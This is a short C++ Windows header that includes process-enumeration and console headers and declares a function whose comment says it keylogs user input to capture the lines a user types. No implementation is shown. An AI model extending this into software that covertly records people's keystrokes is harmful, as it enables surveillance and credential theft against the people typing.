#include <iostream> 
#include <conio.h>
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <thread>
#include <memory>

#define ENTER 13                 //  ASCII representation of ENTER key used to delineate lines entered by user

#pragma once 

class App ;
void concatLines(std::shared_ptr<App> app);    // Function to keylog user input to view lines written by user


